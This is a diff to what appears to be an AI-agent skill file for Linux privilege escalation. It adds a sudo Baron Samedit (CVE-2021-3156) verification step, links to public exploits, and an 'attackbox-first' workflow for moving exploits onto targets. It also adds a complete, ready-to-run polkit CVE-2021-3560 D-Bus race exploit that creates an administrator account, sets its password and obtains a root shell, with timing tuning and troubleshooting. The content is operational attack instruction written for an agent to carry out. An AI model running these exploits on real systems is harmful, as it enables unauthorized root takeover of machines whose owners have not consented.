@@ -6,9 +6,10 @@ description: >
   SUID binaries, or capabilities on binaries, or says "exploit sudo", "abuse suid",
   "gtfobins", "ld_preload", "capability escalation", "baron samedit", "sudo exploit".
   Also triggers on: "sudo -l shows NOPASSWD", "found suid binary", "getcap shows
-  cap_setuid", "linux capabilities privesc". OPSEC: low-medium (binary execution,
-  library loading create process artifacts). Tools: GTFOBins reference, gcc,
-  python3, getcap, strace, ltrace.
+  cap_setuid", "linux capabilities privesc", "polkit privesc", "CVE-2021-3560",
+  "CVE-2021-4034", "pwnkit", "polkit dbus bypass". OPSEC: low-medium (binary
+  execution, library loading create process artifacts). Tools: GTFOBins reference,
+  gcc, python3, getcap, strace, ltrace, dbus-send.
   Do NOT use for cron/service/D-Bus abuse — use linux-cron-service-abuse instead.
   Do NOT use for file permission/path abuse — use linux-file-path-abuse instead.
 ---
@@ -243,21 +244,39 @@ sudo BASH_ENV=/tmp/evil.sh /path/to/allowed_command
 
 **Affected:** sudo 1.8.2 through 1.9.5p1 (patched in 1.9.5p2).
 
+**MANDATORY — Verify before exploiting.** Distro backports frequently patch
+sudo without changing the version string. Do NOT skip this step even if the
+version appears vulnerable.
+
 ```bash
-# Check version
+# Step 1: Check version
 sudo -V | grep "Sudo version"
 
-# Vulnerability test (does NOT exploit, just confirms)
-sudoedit -s '\' $(python3 -c 'print("A"*65536)')
-# Vulnerable: segfault or memory error
-# Patched: "usage: sudoedit" error
+# Step 2: MANDATORY verification (does NOT exploit, just confirms)
+sudoedit -s '\' $(python3 -c 'print("A"*65536)') 2>&1
+# Vulnerable: segfault, memory corruption, "malloc(): corrupted..."
+# Patched: "usage: sudoedit" error message
+#
+# If you see "usage:" → STOP. This build is patched. Do not waste time
+# downloading or compiling exploits. Check CVE-2021-3560 (polkit) or
+# other vectors instead.
+```
 
-# Exploits (multiple variants by OS):
+If verification confirms vulnerability, proceed with exploitation. Public
+exploits exist per distribution — match the target OS and use the correct
+variant.
+
+**Exploit transfer — attackbox-first workflow:** Targets often lack internet
+access (CTF, air-gapped labs). Never `git clone` on target. Instead:
+1. Download/compile exploit on attackbox for target architecture
+2. Transfer via SSH (SCP, SFTP, paramiko) or base64 encode/decode
+3. Alternatively, write exploit source as a heredoc and compile on target
+
+```bash
+# Exploits (multiple variants by OS — download on ATTACKBOX first):
 # https://github.com/blasty/CVE-2021-3156
 # https://github.com/worawit/CVE-2021-3156
 ```
-
-Public exploits exist per distribution. Match the target OS and use the correct variant.
 
 ### CVE-2019-14287 — User ID Bypass
 
@@ -286,6 +305,123 @@ ls -la /run/sudo/ts/$(whoami) 2>/dev/null || ls -la /var/run/sudo/ts/$(whoami) 2
 # https://github.com/nongiach/sudo_inject
 # Creates invalid token → next sudo -i requires no password
 ```
+
+### CVE-2021-3560 — Polkit D-Bus Authentication Bypass
+
+**Affected:** polkit < 0.117 (common on CentOS 8, RHEL 8, Ubuntu 20.04).
+
+Creates a privileged user account by exploiting a race condition in polkitd's
+D-Bus message handling. When a D-Bus request is killed mid-flight (after polkitd
+starts processing but before it replies), polkitd treats the absent reply as
+"authorized."
+
+**Prerequisites:**
+
+```bash
+# All four must be true:
+rpm -q polkit 2>/dev/null || dpkg -l policykit-1 2>/dev/null  # polkit < 0.117
+rpm -q accountsservice 2>/dev/null || dpkg -l accountsservice 2>/dev/null  # installed
+which dbus-send 2>/dev/null  # available
+ps aux | grep polkit  # polkitd running
+```
+
+**Phase 1 — Create privileged user via D-Bus race condition:**
+
+```bash
+NEW_USER="youruser"
+NEW_FULLNAME="Your Name"
+
+# Generate password hash for the new account
+NEW_PASS='YourPassword123!'
+HASH=$(openssl passwd -6 "$NEW_PASS" 2>/dev/null)
+
+# Race loop: send CreateUser request and kill it mid-authorization
+# int32:1 = administrator (wheel/sudo group)
+for i in $(seq 1 100); do
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+        --print-reply /org/freedesktop/Accounts \
+        org.freedesktop.Accounts.CreateUser \
+        string:"$NEW_USER" string:"$NEW_FULLNAME" int32:1 &
+    PID=$!
+    # Timing is critical — 0.005s to 0.015s covers most systems
+    # Start at 0.008s; adjust if needed
+    sleep 0.008s
+    kill $PID 2>/dev/null
+    wait $PID 2>/dev/null
+
+    if id "$NEW_USER" &>/dev/null; then
+        echo "[+] User created on attempt $i"
+        break
+    fi
+done
+
+# Verify user was created with admin group
+id "$NEW_USER"
+```
+
+**Phase 2 — Set password via D-Bus race condition:**
+
+```bash
+# Get the new user's D-Bus object path
+USER_PATH=$(dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+    --print-reply /org/freedesktop/Accounts \
+    org.freedesktop.Accounts.FindUserByName \
+    string:"$NEW_USER" 2>/dev/null | grep "object path" | cut -d'"' -f2)
+
+echo "[*] User D-Bus path: $USER_PATH"
+
+# Same race condition to set password
+for i in $(seq 1 100); do
+    dbus-send --system --dest=org.freedesktop.Accounts --type=method_call \
+        --print-reply "$USER_PATH" \
+        org.freedesktop.Accounts.User.SetPassword \
+        string:"$HASH" string:"" &
+    PID=$!
+    sleep 0.008s
+    kill $PID 2>/dev/null
+    wait $PID 2>/dev/null
+done
+```
+
+**Phase 3 — Verify and escalate:**
+
+```bash
+# Switch to new user and verify sudo
+su - "$NEW_USER" -c "echo '$NEW_PASS' | sudo -S id"
+# Expected: uid=0(root) gid=0(root) groups=0(root)
+
+# Get root shell
+su - "$NEW_USER"
+# Then: sudo -i (or echo password | sudo -S bash)
+```
+
+**Timing calibration:** The sleep value (0.008s) is timing-dependent. If the
+exploit fails after 100 attempts:
+- Try 0.005s (faster systems, VMs with low latency)
+- Try 0.012s (slower systems, remote SSH)
+- Try 0.003s (very fast local systems)
+- Run multiple rounds with different timings
+
+The race typically succeeds within 20-50 attempts on most systems. If user
+creation works but password setting fails (or vice versa), adjust timing for
+each phase independently.
+
+**Remote execution via SSH (paramiko/sshpass):** When automating over SSH,
+write the exploit as a bash script, transfer it via SFTP or heredoc, then
+execute. The race condition timing works the same over SSH — the `sleep` and
+`kill` happen on the target, not the attackbox.
+
+**Troubleshooting:**
+- `Error org.freedesktop.Accounts.Error.PermissionDenied` on every attempt →
+  polkitd may be patched or not running. Check `systemctl status polkit`.
+- User created but not in wheel/sudo group → the `int32:1` flag sets
+  administrator. Verify with `id username`. If not admin, the race lost on
+  the group assignment — delete user and retry.
+- Password not set (su fails) → the SetPassword race is harder to win. Try
+  more attempts (200+) or different timing. Verify the hash is correct:
+  `grep username /etc/shadow`.
+- `dbus-send` not found → install `dbus` package or check `/usr/bin/gdbus`
+  as alternative.
 
 ## Step 5: SUID Binary Exploitation
 
